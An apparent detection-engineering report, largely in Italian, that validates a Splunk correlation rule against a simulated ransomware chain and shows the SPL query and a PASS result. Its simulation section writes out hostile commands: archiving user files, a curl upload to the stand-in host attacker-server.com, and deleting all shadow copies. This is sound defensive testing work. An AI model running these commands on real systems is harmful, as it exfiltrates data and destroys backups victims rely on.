# 🧪 Validation Report: Correlation Rule - Ransomware Exfiltration

## 📋 Informazioni Generali
* **Correlation Name:** Multi-Stage Attack: Ransomware Data Staging & Impact
* **Regola di Riferimento:** `14-Correlation-Ransomware-Exfiltration.md`
* **Severity:** 🔴 CRITICAL
* **Obiettivo:** Rilevare la preparazione, l'esfiltrazione e la distruzione dei backup tipici di un ransomware in azione.

## 🎯 The Attack Chain (Kill Chain Simulata)
I comandi sono stati lanciati in successione (entro 24 ore) per simulare lo script finale di un ransomware.

**Fase 1: Collection / Data Staging (Compressione file locali)**
```cmd
7z.exe a -t7z C:\Temp\exfil_data.7z C:\Users\Public\Documents\*
```

**Fase 2: Exfiltration (Invio verso server esterno)**
```cmd
curl.exe -F "file=@C:\Temp\exfil_data.7z" [http://attacker-server.com/upload](http://attacker-server.com/upload)
```

**Fase 3: Impact (Distruzione Shadow Copies)**
```cmd
vssadmin.exe delete shadows /all /quiet
```

<img width="840" height="194" alt="Screenshot 2026-06-14 173643" src="https://github.com/user-attachments/assets/21ef1d3a-1a7c-4bcd-955b-110b1f260a98" />

---

## 📡 Telemetria Attesa

1. `EventCode 4688` / `EventCode 1` per `7z.exe` o `WinRAR.exe`
2. `EventCode 4688` / `EventCode 1` per `curl.exe` o `rclone.exe`
3. `EventCode 4688` / `EventCode 1` per stringa `vssadmin delete shadows`

## 🔴 Correlated Splunk Query (SPL)

```SPL
(index=wineventlog OR index=sysmon) CommandLine=* 
(
  (EventCode=4688 OR EventCode=1) (CommandLine="*7z.exe*" OR CommandLine="*WinRAR.exe*")
) OR (
  (EventCode=4688 OR EventCode=1) (CommandLine="*rclone.exe*" OR CommandLine="*curl.exe*")
) OR (
  (EventCode=4688 OR EventCode=1) (CommandLine="*vssadmin*" CommandLine="*delete*" CommandLine="*shadows*")
)
| transaction host maxspan=24h
| search (CommandLine="*7z.exe*" OR CommandLine="*WinRAR.exe*") (CommandLine="*rclone.exe*" OR CommandLine="*curl.exe*") CommandLine="*vssadmin*" CommandLine="*delete*" CommandLine="*shadows*"
| eval Attack_Chain = "ATTACCO CRITICO: Compressione Dati -> Esfiltrazione su Internet -> Distruzione Shadow Copies"
| table _time, host, duration, Attack_Chain<img width="840" height="194" alt="Screenshot 2026-06-14 173643" src="https://github.com/user-attachments/assets/342fb98f-05ca-43a0-b81c-4e097539bcab" />

```

## ✅ Risultato della Validazione e Screenshot
Le tre azioni devastanti sono state correlate in un unico allarme ad altissima priorità.

**Risultato:** `PASS` 🟢
